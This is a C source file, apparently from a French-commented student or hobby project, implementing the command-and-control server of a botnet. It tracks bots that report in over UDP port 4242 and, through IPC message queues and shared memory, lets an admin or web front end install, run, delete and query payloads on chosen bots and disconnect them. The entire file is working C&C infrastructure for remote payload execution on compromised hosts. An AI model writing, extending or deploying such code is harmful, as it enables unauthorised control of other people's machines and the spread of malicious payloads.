#include "candc.h"

ptr_liste_sock sock = NULL;
ptr_liste liste = NULL;

key_t key_candc = 1000;
key_t key_admin = 2000;

clock_t t1; //on recupere le temps pour reference pour rafraichir la liste bots

/* Gestion des signaux */
void handler(int sig){
  if(sig == SIGINT){
		destructionFileIPC(msgid1);
    deleteSHM(shmid_candc_pid);
    deleteSHM(shmid_bot_list);
    deleteSHM(shmid_bot_list_length);
    exit(EXIT_SUCCESS);
  }
  if(sig == SIGUSR1){
    manageSHM();
    action.sa_handler = handler;
    sigaction(SIGUSR1, &action, NULL);
  }
  if(sig == SIGUSR2){
    received_SHM = 1;
    sigaction(SIGUSR2, &action, NULL);
  }
}

/* Fonction pour la reception UDP */
int traitement(unsigned char *message,char* hote, char* service){
  clock_t t2=clock();
  if(((t2-t1)/CLOCKS_PER_SEC)>10){
    supp_liste(&liste);
    t1=clock();
  }
  else{
  	unsigned char id[T_ID];
  	unsigned char life[T_L];
  	memcpy(id,message, T_ID);
  	memcpy(life,message + T_ID, T_L);

  	inserer_sans_doublon(&liste, id, life, hote, service);
  }
	return 0;
}

void receptionUDP(){
 	/* Creation Socket pour reception UDP */
	char *port = "4242";
	int socket = initialisationSocketUDP(port);

  /* Ecoute UDP */
  boucleServeurUDP(socket, traitement);
}

/* Fonction de gestion de la communication IPC avec l'admin avec appels des fonctions de gestionBot */
void IPC(){
	action.sa_handler = handler;
	sigset_t ens;

	initSIGINT(ens);

	//Création file de messages C&C
	msgid1 = FileIPC_create(key_candc);
  if(msgid1<0){
			exit(EXIT_FAILURE);
	}
	printf("Message thread C&C ID : %d\n", msgid1);


	while(1){
		//Attente de confirmation de connexion de l'admin à la file du C&C
		data_t message_rcv = receptionIPC(msgid1, 0);
		if(message_rcv.type != 1) continue;

		//Confirmation de connexion de l'admin à la file du C&C
		printf("Admin connected to C&C message thread\n");

		//Récupération file de messages admin
		msgid2 = FileIPC_get(key_admin);
    if(msgid2<0){
  			destructionFileIPC(msgid1);
  			exit(EXIT_FAILURE);
  	}
		printf("Message thread admin ID : %d\n", msgid2);

	  envoiIPC(msgid2, 9, "C&C connected to admin message thread");

		message_rcv = receptionIPC(msgid1, 0);


    fflush(NULL);

		switch(message_rcv.type){

			case 2 : {
        //demande liste bots
				char* list=malloc(MAX_TAMPON); //pour la liste de bot
        ptr_liste parcoursListe = liste; //pointeur pour parcourir la liste de bot

				while(parcoursListe!=NULL){
					list=print_liste(parcoursListe);
					envoiIPC(msgid2,10,list);
					parcoursListe=parcoursListe->next;
				}
				envoiIPC(msgid2, 10, "fin");
				break;
      }

			case 3 : {
				//installation de la charge
				char ip[T_IP];
				char charge[T_CHARGE];
				strcpy(ip,message_rcv.buf);
				message_rcv=receptionIPC(msgid1,0);
				strcpy(charge,message_rcv.buf);

        int i=installChargeLocal(ip,charge);

				if(i==-2)
					envoiIPC(msgid2, 11, "Error, payload doesn't install, wrong name or non-existent file\n");
				else if(i==-1)
          envoiIPC(msgid2, 11, "Error, check if the bot is connected or if the ip address is correct\n");
        else
          envoiIPC(msgid2, 11, "Payload installed\n");
				break;
			}

			case 4 : {
				//lancement de la charge
				char ip[T_IP];
				char charge[T_CHARGE];
				char result[MAX_TAMPON];
				int index;
				strcpy(ip,message_rcv.buf);
        message_rcv=receptionIPC(msgid1,0);
        strcpy(charge,message_rcv.buf);
				index = runChargeLocal(ip,charge);
        if(index==-1)
          envoiIPC(msgid2,12,"Payload doesn't exist or doesn't contain a start function\n");
        else if(index==-2)
          envoiIPC(msgid2,12,"Error, check if the bot is connected or if the ip address is correct\n");
        else{
  				sprintf(result,"Execution index : %d",index);
  				envoiIPC(msgid2, 12 ,result);
  				}
				break;
			}

			case 5 : {
				//resultat de l'execution
        char ip[T_IP];
        strcpy(ip,message_rcv.buf);
        message_rcv=receptionIPC(msgid1,0);
        int indx=atoi(message_rcv.buf);
        char* result;
        result=askResultToBot(indx,ip);

        if(strcmp(result,"error\n")==0)
            envoiIPC(msgid2, 13, "Error, wrong index\n");
        else if(strcmp(result,"errorConnexion\n")==0)
            envoiIPC(msgid2, 13,"Error, check if the bot is connected or if the ip address is correct\n");
        else
				    envoiIPC(msgid2, 13,result);

        free(result);
				break;
      }

			case 6 : {
				//supprimer une charge_size
        char ip[T_IP];
				char charge[T_CHARGE];
				strcpy(ip,message_rcv.buf);
        message_rcv=receptionIPC(msgid1,0);
        strcpy(charge,message_rcv.buf);
				int r = askRemoveToBot(ip,charge);

        if(r==-1)
				    envoiIPC(msgid2, 14, "Payload doesn't exist\n");
        else if(r==-2)
            envoiIPC(msgid2, 14,"Error, check if the bot is connected or if the ip address is correct\n");
        else
            envoiIPC(msgid2, 14, "Payload deleted\n");

        break;
      }

			case 7 : {
				//quitter un bots
        char ip[T_IP];
				strcpy(ip,message_rcv.buf);
        int t = askDisconnectToBot(ip, &sock);

        if (t==-1)
				    envoiIPC(msgid2, 15, "Bot isn't connected or does not exist\n");
        else
            envoiIPC(msgid2, 15, "Bot disconnected\n");

        break;
      }

      case 8 : {
				//état d'un bot
        char ip[T_IP];
        strcpy(ip,message_rcv.buf);

        char* status;
        status=askStatusToBot(ip);

        if(strcmp(status,"error\n")==0)
            envoiIPC(msgid2, 16, "Error, check if the bot is connected or if the ip address is correct\n");
        else
				    envoiIPC(msgid2, 16, status);

        free(status);
        break;
      }
		}
	}

	destructionFileIPC(msgid1);
}

/**********************************************/
/**Fonctions de gestion du serveur à distance**/
/**********************************************/

/* Initialisation des SHM de pid et de liste */
void initSHM(){
  shmid_candc_pid = createSHM(KEY_CANDC_PID, sizeof(pid_t));
  shmid_bot_list_length = createSHM(KEY_BOT_LIST_LENGTH, sizeof(int));
  shmid_bot_list = createSHM(KEY_BOT_LIST, MAX_LIST);

  pid_t candc_pid = getpid();
  writeSHM_int(KEY_CANDC_PID, &candc_pid, sizeof(pid_t));
}

/* Fonction d'envoi de la liste de bots par SHM */
void sendBotsListSHM(ptr_liste list){
  char* char_list = malloc(MAX_TAMPON);
  memset(char_list, 0, MAX_TAMPON);

  ptr_liste browseList = NULL;
  browseList = list;

	while(browseList != NULL){
    memcpy(char_list+strlen((char*)char_list), "\n", 1);
		memcpy(char_list+strlen((char*)char_list), print_list_compact(browseList), strlen(print_list_compact(browseList)));
		browseList = browseList -> next;
	}

  int list_size = strlen(char_list);

  writeSHM_int(KEY_BOT_LIST_LENGTH, &list_size, sizeof(int));
  writeSHM_unsigned_char(KEY_BOT_LIST, (unsigned char*)char_list, list_size);

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  free(char_list);
}

/* Fonction de gestions des commandes envoyées par le serveur web avec appels des différentes fonctions de gestionBot */
void manageSHM(){
  server_pid = readSHM_int(KEY_SERVER_PID, sizeof(pid_t));

  int* command_id;
  command_id = readSHM_int(KEY_COMMAND_ID, sizeof(int));

  if(*command_id == ID_FORM){
    printf("\nServer > User is on form page\n");
    sendBotsListSHM(liste);
    printf("C&C > Updated bots list sent to server\n");
  }
  else if(*command_id == ID_LIST){
    printf("\nServer > User asks bots list\n");
    sendBotsListSHM(liste);
    printf("C&C > Bots list sent to server\n");
  }
  else{
    int* host_length;
    host_length = readSHM_int(KEY_HOST_LENGTH, sizeof(int));

    char host[*host_length];
    unsigned char* pt_host;
    pt_host = readSHM_unsigned_char(KEY_HOST, *host_length);
    strcpy(host, (char*)pt_host);

    int* service_length;
    service_length = readSHM_int(KEY_SERVICE_LENGTH, sizeof(int));

    char service[*service_length];
    unsigned char* pt_service;
    pt_service = readSHM_unsigned_char(KEY_SERVICE, *service_length);
    strcpy(service, (char*)pt_service);

    switch (*command_id) {
      case ID_INSTALL :
        printf("\nServer > User asks to install a payload on a bot (host : %s, service : %s)\n", host, service);
        installChargeSHM(host);
        printf("C&C > Installation done (or not)\n");
        break;
      case ID_RUN :
      {
        printf("\nServer > User asks to run a payload on a bot (host : %s, service : %s)\n", host, service);
        runChargeSHM(host);
        printf("C&C > Execution done (or not)\n");
        break;
      }
      case ID_DELETE :
        printf("\nServer > User asks to remove a payload from a bot (host : %s, service : %s)\n", host, service);
        removeChargeSHM(host);
        break;
      case ID_RESULT :
        printf("\nServer > User asks the result of a payload execution on a bot (host : %s, service : %s)\n", host, service);
        resultRunningSHM(host);
        printf("C&C > Result sent (or not)\n");
        break;
      case ID_QUIT :
        printf("\nServer > User asks to disconnect C&C from a bot (host : %s, service : %s)\n", host, service);
        disconnectSHM(host);
        break;
      case ID_STAT :
        printf("\nServer > User asks the status of a bot (host : %s, service : %s)\n", host, service);
        statSHM(host);
        break;
      default : break;
    }

    detachSHM(pt_service);
    detachSHM(service_length);
    detachSHM(pt_host);
    detachSHM(host_length);
  }

  detachSHM(command_id);
  detachSHM(server_pid);
}


int main(){
	//initialisation des variables nécessaires aux SHM
  initSHM();

	//initialisation des signaux
	action.sa_handler = handler;
  action.sa_flags = SA_RESTART;
  sigaction(SIGINT, &action, NULL);
  sigaction(SIGUSR1, &action, NULL);
  sigaction(SIGUSR2, &action, NULL);

  t1=clock();                          //clock pour reference temps rafraichissement liste
	lancerFlux(receptionUDP,NULL,0);
	lancerFlux(IPC,NULL,0);
	while(1){}

	destructionFileIPC(msgid1);
  deleteSHM(shmid_candc_pid);
  deleteSHM(shmid_bot_list);
  deleteSHM(shmid_bot_list_length);

	return 0;
}
